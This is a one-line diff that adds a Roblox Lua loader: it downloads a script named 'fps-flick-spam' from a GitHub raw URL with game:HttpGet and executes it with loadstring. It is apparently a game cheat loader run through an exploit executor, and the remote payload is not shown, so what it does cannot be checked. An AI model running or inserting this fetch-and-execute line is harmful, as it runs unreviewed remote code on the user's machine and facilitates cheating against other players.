@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/codefinchpalace/loaders/main/loaders/fps-flick-spam2-wbumcpe9evrguv.lua"))()
